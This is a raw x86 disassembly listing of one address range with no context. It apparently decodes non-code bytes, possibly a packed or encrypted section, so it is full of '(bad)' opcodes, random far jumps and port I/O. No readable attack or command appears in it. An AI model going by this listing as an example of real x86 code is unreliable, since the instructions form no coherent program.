  41901b:	int3   
  41901c:	aaa    
  41901d:	aas    
  41901e:	fdiv   DWORD PTR [edx-0x7b]
  419021:	popf   
  419022:	in     al,0xfe
  419024:	mov    ds:0xc166d406,al
  419029:	stos   BYTE PTR es:[edi],al
  41902a:	ja     0x4190a6
  41902c:	xchg   BYTE PTR [ebp+0x3661590f],cl
  419032:	sub    bh,0xa2
  419035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419036:	adc    BYTE PTR [eax+0x23],bh
  419039:	jns    0x419076
  41903b:	bound  eax,QWORD PTR [esi+0xe0b18cb]
  419041:	and    eax,0xedcc4a36
  419046:	inc    edx
  419047:	addr16 push ecx
  419049:	add    eax,0xa79bca7b
  41904e:	sub    BYTE PTR [edx+0x64011149],al
  419054:	cmp    dl,bh
  419056:	aaa    
  419057:	push   0xfffffff8
  419059:	cdq    
  41905a:	cli    
  41905b:	ret    
  41905c:	add    eax,0xed205977
  419061:	sti    
  419062:	bound  edx,QWORD PTR [ebx+ebp*8-0x42]
  419066:	in     eax,0x9
  419068:	sbb    al,0x5
  41906a:	push   esi
  41906b:	scas   eax,DWORD PTR es:[edi]
  41906c:	scas   eax,DWORD PTR es:[edi]
  41906d:	aas    
  41906e:	xchg   edx,eax
  41906f:	xchg   DWORD PTR [eax],ebx
  419071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419072:	mov    esp,0x1aa5c4e7
  419077:	shl    esp,1
  419079:	pop    esi
  41907a:	in     eax,0x5c
  41907c:	cmp    ebp,DWORD PTR [ebp+edi*8+0x4ff08742]
  419083:	mov    eax,ds:0xb012a14d
  419088:	sbb    eax,0x2dcc1cd7
  41908d:	jg     0x4190de
  41908f:	in     eax,0xa4
  419091:	call   0x9cf16238
  419096:	nop
  419097:	lea    esp,[ecx]
  419099:	and    ah,BYTE PTR [edi]
  41909b:	cmp    al,0xf9
  41909d:	lods   al,BYTE PTR ds:[esi]
  41909e:	mov    ebp,0xee461ab2
  4190a3:	aam    0x4a
  4190a5:	and    ah,BYTE PTR [esi+0x8]
  4190a8:	sbb    edi,edi
  4190aa:	dec    DWORD PTR [ecx-0xcf7af2]
  4190b0:	out    0x5d,al
  4190b2:	je     0x41908c
  4190b4:	clc    
  4190b5:	or     ecx,DWORD PTR [ebp+0x35]
  4190b8:	adc    BYTE PTR ds:0xe1b9e3e6,ah
  4190be:	popa   
  4190bf:	stos   DWORD PTR es:[edi],eax
  4190c0:	dec    esi
  4190c1:	cld    
  4190c2:	or     BYTE PTR [edi+0x45],dh
  4190c5:	ror    BYTE PTR [eax],1
  4190c7:	pop    ss
  4190c8:	jge    0x4190cf
  4190ca:	sub    eax,0x4d9ec8ca
  4190cf:	sub    esi,ebx
  4190d1:	inc    eax
  4190d2:	enter  0x63bc,0x4a
  4190d6:	data16 fdivrp st(6),st
  4190d9:	jb     0x419075
  4190db:	lahf   
  4190dc:	cmp    ebp,DWORD PTR [ebp+0x76c78a64]
  4190e2:	in     al,dx
  4190e3:	jnp    0x41912f
  4190e5:	jge    0x4190fc
  4190e7:	push   esp
  4190e8:	loope  0x419073
  4190ea:	scas   al,BYTE PTR es:[edi]
  4190eb:	mov    ch,0x6d
  4190ed:	push   eax
  4190ee:	gs xchg edi,eax
  4190f0:	mov    bl,0x44
  4190f2:	adc    ebx,DWORD PTR [esi]
  4190f4:	mov    ebp,0xd252b45e
  4190f9:	ficomp DWORD PTR ds:0x96327765
  4190ff:	push   ecx
  419100:	gs icebp 
  419102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419103:	das    
  419104:	dec    edx
  419105:	mov    eax,ds:0x89757c98
  41910a:	adc    eax,DWORD PTR [ecx-0x17]
  41910d:	sub    eax,0x1f3d6f3f
  419112:	lds    edx,FWORD PTR [edi+0x15]
  419115:	(bad)  
  419117:	rcl    DWORD PTR [edx+0x54],cl
  41911a:	and    edx,DWORD PTR [edi+eax*2]
  41911d:	xchg   ebp,eax
  41911e:	loopne 0x4190ce
  419120:	stc    
  419121:	stos   BYTE PTR es:[edi],al
  419122:	ja     0x4190ac
  419124:	push   edx
  419125:	ret    0x859f
  419128:	cmp    al,0xf9
  41912a:	fnstsw WORD PTR [edx]
  41912c:	mov    bh,0xa
  41912e:	xor    eax,0x2864a598
  419133:	jne    0x419169
  419135:	dec    eax
  419136:	lods   al,BYTE PTR ds:[esi]
  419137:	outs   dx,DWORD PTR ds:[esi]
  419138:	adc    BYTE PTR [edi+0x32],ah
  41913b:	fidiv  WORD PTR [edx]
  41913d:	fist   WORD PTR [edx]
  41913f:	not    BYTE PTR [esi]
  419141:	test   DWORD PTR ds:0x53b1f7f9,esi
  419147:	cmp    DWORD PTR [esi+edi*8+0xfc3f3aa],esi
  41914e:	dec    eax
  41914f:	push   edi
  419150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419151:	popa   
  419152:	in     eax,dx
  419153:	test   BYTE PTR [ebx],dh
  419155:	adc    al,0xf2
  419157:	bound  ebx,QWORD PTR [eax]
  419159:	xchg   ebp,eax
  41915a:	fadd   QWORD PTR [di]
  41915d:	mov    ecx,0xd416cf06
  419162:	mov    ebx,0x21d321fd
  419167:	mov    esi,0xf9005304
  41916c:	xor    DWORD PTR [esi],0x10
  41916f:	test   BYTE PTR [ecx+edi*8],dl
  419172:	adc    BYTE PTR [edi+0x646f2614],cl
  419178:	stc    
  419179:	mov    ch,0xb6
  41917b:	mov    ds:0x9f5cd2dd,eax
  419180:	shl    ah,1
  419182:	out    0xfc,al
  419184:	sub    eax,0x97dc8447
  419189:	mov    cl,0xf9
  41918b:	stc    
  41918c:	outs   dx,BYTE PTR ds:[esi]
  41918d:	sbb    BYTE PTR [esp+esi*1+0x14037674],al
  419194:	pop    es
  419195:	dec    eax
  419196:	pop    ebp
  419197:	dec    esp
  419198:	shl    DWORD PTR [eax],cl
  41919a:	xchg   DWORD PTR [eax],edx
  41919c:	and    ebx,ebx
  41919e:	add    ebx,DWORD PTR [eax-0x60cd24ac]
  4191a4:	scas   eax,DWORD PTR es:[edi]
  4191a5:	xor    ebx,DWORD PTR [ebp+ebp*2+0x4207fb]
  4191ac:	push   0x4d
  4191ae:	mov    ecx,ss
  4191b0:	cmp    eax,0x5d9f9f1c
  4191b5:	pop    es
  4191b6:	loop   0x4191bc
  4191b8:	int    0x2b
  4191ba:	dec    ebp
  4191bb:	out    dx,eax
  4191bc:	aam    0xd0
  4191be:	sbb    edi,DWORD PTR [esi-0x5d]
  4191c1:	mov    cx,0x4169
  4191c5:	pop    ds
  4191c6:	mov    cl,0x95
  4191c8:	or     al,0xe7
  4191ca:	fdiv   DWORD PTR [ebp-0x385e4f3b]
  4191d0:	jp     0x41920e
  4191d2:	or     al,0x46
  4191d4:	ins    BYTE PTR es:[edi],dx
  4191d5:	mov    eax,0x9ced116e
  4191da:	mov    esi,0xe9163572
  4191df:	(bad)  
  4191e0:	dec    edi
  4191e1:	xor    edi,esp
  4191e3:	add    eax,0x3bd7a61c
  4191e8:	pop    ds
  4191e9:	loope  0x4191eb
  4191eb:	loope  0x419265
  4191ed:	std    
  4191ee:	out    0x44,al
  4191f0:	ror    DWORD PTR [ecx+0x7a3d1e93],1
  4191f6:	mov    ecx,0x456082d0
  4191fb:	xchg   edi,eax
  4191fc:	dec    esp
  4191fd:	mov    ah,0x6
  4191ff:	mov    ds:0x34298a35,al
  419204:	and    DWORD PTR [eax],esp
  419206:	in     al,0x98
  419208:	outs   dx,DWORD PTR ds:[esi]
  419209:	fcmovb st,st(3)
  41920b:	scas   eax,DWORD PTR es:[edi]
  41920c:	inc    eax
  41920d:	imul   edx,ecx,0xffffffca
  419210:	retf   0x8e95
  419213:	add    eax,0x8d24c17b
  419218:	mov    ds:0x6de9457b,al
  41921d:	xchg   ebp,eax
  41921e:	mov    cs,WORD PTR [edi+0x8b52f09]
  419224:	iret   
  419225:	std    
  419226:	or     DWORD PTR [esi-0x44e8750f],ebp
  41922c:	add    eax,0x33e6446d
  419231:	ins    DWORD PTR es:[edi],dx
  419232:	cmp    eax,0x900202b9
  419237:	lea    edi,[eax]
  419239:	loope  0x419251
  41923b:	dec    ecx
  41923c:	ret    0xbe98
  41923f:	stos   BYTE PTR es:[edi],al
  419240:	jns    0x4192a5
  419242:	and    eax,DWORD PTR [esi]
  419244:	pop    ebx
  419245:	jo     0x41920c
  419247:	and    BYTE PTR [edx-0x33a1fc36],ah
  41924d:	fstp   TBYTE PTR [eax+ebx*2+0x430d4896]
  419254:	popa   
  419255:	push   ds
  419256:	rcr    DWORD PTR [edi],0xc3
  419259:	gs mov ch,0xd5
  41925c:	xor    dh,BYTE PTR ds:0x1a3b3a39
  419262:	jb     0x4191f3
  419264:	enter  0xbe2,0x8a
  419268:	bswap  esi
  41926a:	add    al,0x46
  41926c:	dec    ecx
  41926d:	adc    al,0xab
  41926f:	popf   
  419270:	cdq    
  419271:	xchg   ebx,eax
  419272:	xchg   ecx,eax
  419273:	inc    esp
  419274:	cld    
  419275:	cmp    ch,ch
  419277:	push   ss
  419278:	call   FWORD PTR [eax]
  41927a:	out    dx,eax
  41927b:	add    BYTE PTR [ecx],0xca
  41927e:	shl    BYTE PTR [edi-0x2bfa1745],1
  419284:	jp     0x41927a
  419286:	push   eax
  419287:	cmp    bh,BYTE PTR [ebp+0xd5e6509]
  41928d:	sbb    edx,0x7b
  419290:	xor    eax,0x67357a3d
  419295:	add    cl,BYTE PTR [eax-0x2e]
  419298:	mov    dh,0xfb
  41929a:	shr    bh,0x13
  41929d:	aas    
  41929e:	fiadd  WORD PTR [edi+eax*2-0x31]
  4192a2:	pusha  
  4192a3:	push   ecx
  4192a4:	ins    BYTE PTR es:[edi],dx
  4192a5:	add    edx,0xf
  4192a8:	inc    eax
  4192a9:	(bad)  
  4192aa:	pop    edi
  4192ab:	xchg   ebx,eax
  4192ac:	lahf   
  4192ad:	cld    
  4192ae:	sbb    BYTE PTR [edx],0xfe
  4192b1:	and    DWORD PTR [esi+esi*4+0x1d],0x85eb46cb
  4192b9:	leave  
  4192ba:	cmp    ah,BYTE PTR [edx+eax*2+0x49ee7909]
  4192c1:	xor    BYTE PTR [edi],al
  4192c3:	lahf   
  4192c4:	repnz test eax,0xef06d888
  4192ca:	rcl    BYTE PTR [esi+0x62],1
  4192cd:	js     0x4192f3
  4192cf:	and    DWORD PTR [ebx+eiz*4+0x6714f4f0],ebx
  4192d6:	test   DWORD PTR [edx],esi
  4192d8:	icebp  
  4192d9:	add    al,0xbc
  4192db:	stos   BYTE PTR es:[edi],al
  4192dc:	and    al,dl
  4192de:	lds    eax,FWORD PTR [eax]
  4192e0:	ja     0x419317
  4192e2:	mov    dl,0xaf
  4192e5:	dec    esi
  4192e6:	dec    edi
  4192e7:	aam    0xe1
  4192e9:	arpl   bp,di
  4192eb:	aaa    
  4192ec:	fwait
  4192ed:	les    esp,FWORD PTR [eax]
  4192ef:	mov    edi,0x9c31974
  4192f4:	sub    DWORD PTR [esp+edx*8-0x50798d61],edx
  4192fb:	rcl    BYTE PTR [esp+edx*1],0x4d
  4192ff:	aad    0x2
  419301:	mov    dl,ch
  419303:	xchg   ebx,eax
  419304:	call   DWORD PTR [ebx-0x1ca63725]
  41930a:	jno    0x41936b
  41930c:	aas    
  41930d:	jl     0x41932a
  41930f:	dec    ebx
  419310:	fcmovbe st,st(7)
  419312:	in     eax,0x66
  419314:	iret   
  419315:	xchg   esp,eax
  419316:	in     eax,0x3
  419318:	fistp  WORD PTR [edx+0xf7a0d25]
  41931e:	jno    0x419316
  419320:	aaa    
  419321:	dec    esi
  419322:	not    ch
  419324:	jmp    0x31aa4382
  419329:	test   al,0x1a
  41932b:	or     esi,DWORD PTR [ecx]
  41932d:	test   eax,0xd9560957
  419332:	mov    al,ds:0xaab2841b
  419337:	mov    bl,0xd5
  419339:	shr    dl,0x71
  41933c:	inc    esp
  41933d:	loopne 0x419378
  41933f:	xchg   edi,eax
  419340:	test   bh,0x24
  419343:	mov    al,BYTE PTR ds:0xe1e5554c
  419349:	cli    
  41934a:	mov    ds:0x4df0ee4d,eax
  41934f:	mov    bh,cl
  419351:	xchg   esp,eax
  419352:	push   ebx
  419353:	ds ss call 0x57bb:0xfe7e2fb7
  41935c:	adc    eax,0xfd5b59ae
  419361:	hlt    
  419362:	gs xchg ebp,esi
  419365:	mov    eax,DWORD PTR [ecx-0x60a2243c]
  41936b:	cmp    DWORD PTR [ebp-0x4],esi
  41936e:	inc    esi
  41936f:	fwait
  419370:	sub    BYTE PTR [ebp+eiz*8-0x10],dl
  419374:	sbb    bl,ch
  419376:	shr    DWORD PTR [edi+eax*4-0x1a],0x62
  41937b:	push   eax
  41937c:	scas   al,BYTE PTR es:[edi]
  41937d:	jno    0x419375
  41937f:	add    esp,ebp
  419381:	ret    
  419382:	mov    ds:0xfde5d7d3,al
  419387:	or     bl,BYTE PTR [bx-0x1783]
  41938c:	retf   0xf2ae
  41938f:	scas   al,BYTE PTR es:[edi]
  419390:	sahf   
  419391:	aaa    
  419392:	call   0x7be6:0xcd51a2f9
  419399:	and    edi,ecx
  41939b:	push   ds
  41939c:	and    eax,0xf3a754d7
  4193a1:	jl     0x4193bc
  4193a3:	scas   eax,DWORD PTR es:[edi]
  4193a4:	test   al,0x7f
  4193a6:	fwait
  4193a7:	and    BYTE PTR [edx-0x34],bh
  4193aa:	inc    ecx
  4193ab:	jmp    0x79cccca3
  4193b0:	js     0x4193e0
  4193b2:	pop    ss
  4193b3:	jne    0x41938d
  4193b5:	lods   al,BYTE PTR ds:[esi]
  4193b6:	sbb    bh,BYTE PTR [eax+0x196d1e45]
  4193bc:	jmp    0x619b:0xb28900fc
  4193c3:	mov    bh,0x27
  4193c5:	imul   esi,esp,0x5e88d015
  4193cb:	pop    ebx
  4193cc:	inc    ebx
  4193cd:	sbb    bl,ah
  4193cf:	mov    eax,ds:0x905238d6
  4193d4:	inc    edx
  4193d5:	addr16 mov ch,0xf8
  4193d8:	(bad)  
  4193da:	xlat   BYTE PTR ds:[ebx]
  4193db:	inc    ebp
  4193dc:	add    eax,0x3f4208ae
  4193e1:	sahf   
  4193e2:	push   0x64
  4193e4:	sbb    BYTE PTR [edx],ah
  4193e6:	sbb    bh,BYTE PTR [ecx+0x75]
  4193e9:	jg     0x4193b5
  4193eb:	xchg   BYTE PTR [eax+0x34],ah
  4193ee:	xchg   edi,eax
  4193ef:	les    edi,FWORD PTR [eax+0x18]
  4193f2:	push   ebx
  4193f3:	popa   
  4193f4:	leave  
  4193f5:	inc    esp
  4193f6:	xchg   ebx,eax
  4193f7:	dec    ebp
  4193f8:	retf   0x7b48
  4193fb:	sbb    al,0x3e
  4193fd:	xor    al,0xc4
  4193ff:	aam    0xfe
  419401:	push   es
  419402:	mov    bl,0xa7
  419404:	or     BYTE PTR [esi],bh
  419406:	ret    0xcc59
  419409:	jno    0x419435
  41940b:	mov    esi,0xd0729feb
  419410:	psubw  mm3,mm5
  419413:	cmp    BYTE PTR [ebp+0x7837a584],dl
  419419:	jge    0x4193b3
  41941b:	cli    
  41941c:	jg     0x41940b
  41941e:	call   0xa0a2c99f
  419423:	mov    ebp,0xef5914a8
  419428:	mul    ecx
  41942a:	les    ecx,FWORD PTR ds:0xfc0fc4eb
  419430:	ror    cl,1
  419432:	inc    esi
  419433:	btc    esi,esp
  419436:	dec    ecx
  419437:	(bad)  
  419438:	out    0x54,eax
  41943a:	sbb    eax,0x4288d94
  41943f:	into   
  419440:	rcl    DWORD PTR [ebx-0x6c],cl
  419443:	pop    ds
  419444:	dec    ecx
  419445:	jle    0x4193d0
  419447:	je     0x4194a8
  419449:	ins    BYTE PTR es:[edi],dx
  41944a:	loope  0x4194a1
  41944c:	lock in al,dx
  41944e:	ret    
  41944f:	add    al,0x83
  419451:	add    cl,BYTE PTR [edi+0x4dbe54fc]
  419457:	aaa    
  419458:	jg     0x41944f
  41945a:	jle    0x419443
  41945c:	sysenter 
  41945e:	loope  0x419404
  419460:	xchg   ebp,eax
  419461:	push   cs
  419462:	or     ecx,edx
  419464:	aas    
  419465:	rol    BYTE PTR [ecx-0x574ee579],0x8e
  41946c:	sub    ebx,edx
  41946e:	sub    al,0x6f
  419470:	cmp    al,0x35
  419472:	out    0x2,al
  419474:	sub    bl,dh
  419476:	xchg   esp,eax
  419477:	into   
  419478:	ins    BYTE PTR es:[edi],dx
  419479:	int3   
  41947a:	mov    esp,0xc7e6d2f7
  41947f:	or     esi,ebp
  419481:	xlat   BYTE PTR ds:[ebx]
  419482:	jmp    0xab1e:0x718a6301
  419489:	pop    ds
  41948a:	add    al,0xa8
  41948c:	sbb    DWORD PTR [ecx-0x6a],ebp
  41948f:	shl    DWORD PTR [ecx-0xb173b22],cl
  419495:	add    al,0x6a
  419497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419498:	sub    al,0xdb
  41949a:	cdq    
  41949b:	js     0x419433
  41949d:	cmp    al,0xd7
  41949f:	lods   al,BYTE PTR ds:[esi]
  4194a0:	xchg   esp,eax
  4194a1:	hlt    
  4194a2:	jnp    0x419468
  4194a4:	mov    ds:0x12de1f52,al
  4194a9:	lock sub DWORD PTR [edx-0x7f],edi
  4194ad:	mov    bh,0x40
  4194af:	and    ah,BYTE PTR [ebx-0x67]
  4194b2:	sub    al,0x69
  4194b4:	adc    eax,0xdf6ab587
  4194b9:	(bad)  
  4194ba:	or     al,0xd5
  4194bc:	ja     0x41945d
  4194be:	mov    ds,WORD PTR [edx]
  4194c0:	fst    DWORD PTR [ebx+0x148bd439]
  4194c6:	jp     0x419480
  4194c8:	adc    al,0x8d
  4194ca:	and    DWORD PTR [esi-0x53b844b0],0xe7d50d4d
  4194d4:	pop    ebp
  4194d5:	jg     0x41948b
  4194d7:	into   
  4194d8:	sub    cl,BYTE PTR [ebx]
  4194da:	dec    esp
  4194db:	cli    
  4194dc:	ret    0x128c
  4194df:	in     eax,0xb6
  4194e1:	loope  0x419502
  4194e3:	imul   edx,esp,0x7c3cc9c
  4194e9:	mov    al,0xca
  4194eb:	jbe    0x419517
  4194ed:	pop    edx
  4194ee:	adc    BYTE PTR [edi+0x6c7212ca],0x4c
  4194f5:	dec    esi
  4194f6:	dec    esi
  4194f7:	adc    BYTE PTR [ebp+0x22],bl
  4194fa:	dec    ecx
  4194fb:	rcr    DWORD PTR [eax-0x232902fd],1
  419501:	fistp  DWORD PTR [eax-0x25]
  419504:	aas    
  419505:	xchg   BYTE PTR [ebx],bh
  419507:	add    BYTE PTR ds:0xba18939c,bh
  41950d:	in     al,dx
  41950e:	lds    esp,FWORD PTR [ebx-0x279989a5]
  419514:	jle    0x419533
  419516:	mov    bl,0xb3
  419518:	push   ss
  419519:	retf   0x3971
  41951c:	loop   0x4194b4
  41951e:	fcom   QWORD PTR [eax+edx*1]
  419521:	push   ebx
  419522:	cmp    eax,0x290eb477
  419527:	adc    eax,edx
  419529:	sub    eax,0x930d097e
  41952e:	sub    eax,0x1cd1ea59
  419533:	mov    ch,0xef
  419535:	mov    esp,0x36579e63
  41953a:	imul   esi,ecx,0x2c687ad2
  419540:	xchg   edi,eax
  419541:	pop    ebx
  419542:	shr    BYTE PTR [esi-0x73],1
  419545:	stos   DWORD PTR es:[edi],eax
  419546:	push   esp
  419547:	test   DWORD PTR [edx+0x10],esi
  41954a:	mov    ebp,0x8e3ea07e
  41954f:	adc    eax,0xcd0f6301
  419554:	mov    bh,0x7b
  419556:	dec    eax
  419557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419558:	mov    eax,ds:0x371e55b5
  41955d:	adc    BYTE PTR [edi+0x1b],cl
  419560:	xor    al,bh
  419562:	push   ebx
  419563:	sub    esp,DWORD PTR [eax-0x26]
  419566:	inc    ecx
  419567:	mov    eax,ds:0x3a9500a9
  41956c:	push   cs
  41956d:	dec    esp
  41956e:	out    dx,eax
  41956f:	push   ecx
  419570:	push   ebp
  419571:	mov    edi,DWORD PTR [eax-0x13]
  419574:	sub    BYTE PTR [ecx-0x15],dl
  419577:	retf   
  419578:	mov    eax,0x2d8f986f
  41957d:	pop    es
  41957e:	lea    edi,[ecx-0xdbbcf55]
  419584:	dec    esp
  419585:	cmp    al,0x8a
  419587:	pop    esi
  419588:	aad    0x6
  41958a:	xchg   edx,eax
  41958b:	icebp  
  41958c:	jg     0x419568
  41958e:	mov    al,ds:0xcd05e40c
  419593:	das    
  419594:	je     0x4195a4
  419596:	add    al,0x7a
  419598:	sahf   
  419599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41959a:	dec    edx
  41959b:	xchg   edx,eax
  41959c:	jge    0x419593
  41959e:	push   ds
  41959f:	sub    ecx,ebx
  4195a1:	push   esp
  4195a2:	push   edi
  4195a3:	mov    ds:0xb6d34493,al
  4195a8:	cld    
  4195a9:	jmp    0x419551
  4195ab:	shr    BYTE PTR [ebx+eiz*4+0x162a7d59],0xcf
  4195b3:	jmp    0x419578
  4195b5:	inc    ecx
  4195b6:	jmp    0x1fd1:0x8811927e
  4195bd:	pop    ebp
  4195be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195bf:	cmp    ah,BYTE PTR [eax]
  4195c1:	and    eax,0xc0b8360a
  4195c6:	dec    eax
  4195c7:	data16 stos BYTE PTR es:[edi],al
  4195c9:	fsub   st,st(6)
  4195cb:	lds    edx,FWORD PTR [esi+0x11146a52]
  4195d1:	fldcw  WORD PTR [eax-0x5]
  4195d4:	stos   BYTE PTR es:[edi],al
  4195d5:	or     al,0xd1
  4195d7:	dec    edx
  4195d8:	sti    
  4195d9:	aaa    
  4195da:	and    al,BYTE PTR [eax-0x6cfbb36b]
  4195e0:	inc    ebx
  4195e1:	(bad)  
  4195e2:	jg     0x419635
  4195e4:	or     BYTE PTR [ecx-0x7],cl
  4195e7:	retf   
  4195e8:	mov    ch,dl
  4195ea:	pop    ds
  4195eb:	adc    BYTE PTR [ebx-0x15],0x8d
  4195ef:	jmp    0x3e244d82
  4195f4:	aad    0xe0
  4195f6:	or     dh,BYTE PTR [eax-0x6f]
  4195f9:	jecxz  0x4195e9
  4195fb:	push   ebp
  4195fc:	dec    esi
  4195fd:	aam    0x4
  4195ff:	inc    ebx
  419600:	push   esi
  419601:	dec    esi
  419602:	shr    ecx,1
  419604:	mov    dl,0xf5
  419606:	pop    es
  419607:	mov    dl,0x45
  419609:	mov    DWORD PTR [edx],ebp
  41960b:	xor    ecx,0xffffff81
  41960e:	rol    BYTE PTR [ecx+0x530d28c2],0xbb
  419615:	popf   
  419616:	in     eax,dx
  419617:	pop    esp
  419618:	popf   
  419619:	popa   
  41961a:	mov    ah,0x2
  41961c:	retf   0x9727
  41961f:	mov    DWORD PTR [ebx-0x25],esp
  419622:	mov    cl,0x92
  419624:	xchg   edi,eax
  419625:	sti    
  419626:	xor    dl,BYTE PTR [edx]
  419628:	xchg   BYTE PTR [ecx+0x14c611e0],bl
  41962e:	mov    cs,WORD PTR [edx+0x65]
  419631:	or     esp,edx
  419633:	push   0x7afe9cbc
  419638:	add    DWORD PTR [eax-0x596f924f],ebp
  41963e:	popa   
  41963f:	mov    cl,0x58
  419641:	inc    ecx
  419642:	out    dx,al
  419643:	and    eax,0xf66b3330
  419648:	out    dx,eax
  419649:	push   es
  41964a:	inc    edi
  41964b:	popa   
  41964c:	mov    dl,0xe1
  41964e:	and    BYTE PTR [edi+0x2a],ch
  419651:	or     dl,BYTE PTR [edx+0x31dbf1a7]
  419657:	adc    dh,dl
  419659:	push   ebp
  41965a:	les    ecx,FWORD PTR [ebx]
  41965c:	aad    0xe7
  41965e:	ins    BYTE PTR es:[edi],dx
  41965f:	dec    ebx
  419660:	mov    WORD PTR [ebx+0x9],gs
  419663:	inc    edi
  419664:	aas    
  419665:	pop    edi
  419666:	inc    edi
  419667:	sbb    dl,BYTE PTR [ecx+eiz*8]
  41966a:	add    eax,0xaddda8f2
  41966f:	ja     0x419695
  419671:	nop
  419672:	lahf   
  419673:	test   ecx,0xf4f31569
  419679:	mov    BYTE PTR [eax+0x419905f8],bl
  41967f:	sbb    al,0xfe
  419681:	inc    ebp
  419682:	jae    0x419667
  419684:	in     eax,dx
  419685:	cdq    
  419686:	pop    es
  419687:	pusha  
  419688:	leave  
  419689:	jo     0x4196e2
  41968b:	out    dx,al
  41968c:	mov    bh,0xde
  41968e:	push   edi
  41968f:	ss (bad) 
  419691:	scas   al,BYTE PTR es:[edi]
  419692:	jmp    0x5342:0x39b12939
  419699:	mov    ah,0xc0
  41969b:	fist   WORD PTR [ebp+0x4b87eb33]
  4196a1:	addr16 int3 
  4196a3:	pop    ebx
  4196a4:	(bad)  
  4196a6:	xor    edi,DWORD PTR [ebx+0x56]
  4196a9:	mov    ds:0xb87907df,al
  4196ae:	jg     0x4196cd
  4196b0:	mov    gs,WORD PTR ds:0x5fa91bfb
  4196b6:	xchg   edi,eax
  4196b7:	fdivrp st(7),st
  4196b9:	popf   
  4196ba:	test   al,0x9e
  4196bc:	aam    0xbd
  4196be:	cld    
  4196bf:	mov    ah,0xa2
  4196c1:	scas   eax,DWORD PTR es:[edi]
  4196c2:	and    bh,BYTE PTR [eax]
  4196c4:	cmp    eax,0x6cbcfca8
  4196c9:	xor    dh,BYTE PTR [esi]
  4196cb:	scas   al,BYTE PTR es:[edi]
  4196cc:	jnp    0x419657
  4196ce:	stos   DWORD PTR es:[edi],eax
  4196cf:	(bad)  
  4196d1:	das    
  4196d2:	cmp    eax,esp
  4196d4:	cmp    BYTE PTR [ebp-0x133c1f42],bl
  4196da:	push   es
  4196db:	mov    ebp,0x9c33bd50
  4196e0:	sub    eax,0x5677bad9
  4196e5:	jbe    0x4196fc
  4196e7:	push   esp
  4196e8:	(bad)  
  4196e9:	mov    dl,0x70
  4196eb:	mov    esi,0xb08556eb
  4196f0:	pop    ds
  4196f1:	push   ebp
  4196f2:	mov    esi,0x800516b8
  4196f7:	jae    0x4196d4
  4196f9:	in     eax,0xc8
  4196fb:	(bad)  
  4196fc:	cli    
  4196fd:	mov    ecx,0xfa315d74
  419702:	call   0xf4f1bc31
  419707:	xchg   esp,eax
  419708:	es test edi,0xcd25bdd6
  41970f:	in     al,0xa4
  419711:	mov    ebp,DWORD PTR [edx]
  419713:	retf   0x7f9
  419716:	adc    eax,0xccfcb633
  41971b:	loop   0x419766
  41971d:	sub    al,0xdb
  41971f:	nop
  419720:	pop    esp
  419721:	dec    edx
  419722:	aad    0xe3
  419724:	(bad)  
  419726:	mov    al,0x28
  419728:	xor    al,0xc9
  41972a:	xchg   ebx,eax
  41972b:	cmp    al,0x3e
  41972d:	pop    eax
  41972e:	sub    eax,0xa05b6115
  419733:	mov    bl,0x19
  419735:	lahf   
  419736:	out    dx,al
  419737:	pop    edi
  419738:	push   ss
  419739:	jnp    0x419729
  41973b:	pop    eax
  41973c:	fnstsw WORD PTR [ebx]
  41973e:	ss jp  0x419759
  419741:	fisttp WORD PTR [eax-0x20]
  419744:	jg     0x4196c8
  419746:	mov    cl,0xba
  419748:	pop    esp
  419749:	ror    BYTE PTR [edi],cl
  41974b:	mov    ch,0x89
  41974d:	scas   al,BYTE PTR es:[edi]
  41974e:	xchg   ebp,eax
  41974f:	sub    edx,DWORD PTR [ecx]
  419751:	out    0xab,al
  419753:	jae    0x419785
  419755:	jp     0x4197c6
  419757:	jecxz  0x4197b2
  419759:	xchg   esi,eax
  41975a:	sbb    DWORD PTR [ecx],esi
  41975c:	and    eax,0xccfdf7d5
  419761:	cmc    
  419762:	mov    cl,0x4c
  419764:	out    dx,eax
  419765:	xlat   BYTE PTR ds:[ebx]
  419766:	fistp  WORD PTR [edx]
  419768:	(bad)  
  419769:	faddp  st(2),st
  41976b:	div    BYTE PTR [esi]
  41976d:	gs popa 
  41976f:	ins    BYTE PTR es:[edi],dx
  419770:	mov    ch,0x87
  419772:	or     DWORD PTR [eax-0x7d],0x5d
  419776:	daa    
  419777:	and    DWORD PTR [esi-0xb],esi
  41977a:	je     0x419790
  41977c:	(bad)  
  41977d:	clc    
  41977e:	mov    bh,0x3a
  419780:	loop   0x4197ff
  419782:	cmp    al,0x1b
  419785:	and    BYTE PTR [edx+0x2a],0x88
  419789:	pusha  
  41978a:	mov    cl,0xe8
  41978c:	js     0x419725
  41978e:	inc    esi
  41978f:	jg     0x41980b
  419791:	inc    edi
  419792:	dec    ecx
  419793:	rol    BYTE PTR [edi*4+0x425484c4],cl
  41979a:	mov    esp,DWORD PTR [esi+edi*8+0x46]
  41979e:	pushf  
  41979f:	addr16 aam 0xdb
  4197a2:	jmp    0xcdc7:0x17a4d5ac
  4197a9:	jae    0x4197f8
  4197ab:	stc    
  4197ac:	imul   esi,DWORD PTR [eax+edx*8-0x3223a1ab],0x2d07e9cb
  4197b7:	adc    ebp,edi
  4197b9:	pushf  
  4197ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197bb:	ret    
  4197bc:	cs in  al,0xa3
  4197bf:	add    ch,BYTE PTR [ecx]
  4197c1:	add    BYTE PTR [ecx],bl
  4197c3:	push   es
  4197c4:	jae    0x419762
  4197c6:	cwde   
  4197c7:	and    ch,ah
  4197c9:	sub    eax,0x1ecc514f
  4197ce:	pop    ebx
  4197cf:	pop    ss
  4197d0:	mov    dh,cl
  4197d2:	sbb    BYTE PTR [edi+0x3],ch
  4197d5:	inc    ebp
  4197d6:	ss call 0x9f98:0xad5b16c
  4197de:	xchg   edi,eax
  4197df:	aaa    
  4197e0:	mul    ah
  4197e2:	pop    ecx
  4197e3:	adc    al,0x42
  4197e5:	and    eax,DWORD PTR [edx+0x73]
  4197e8:	xor    ebp,DWORD PTR [edx]
  4197ea:	push   cs
  4197eb:	test   DWORD PTR [ecx],ecx
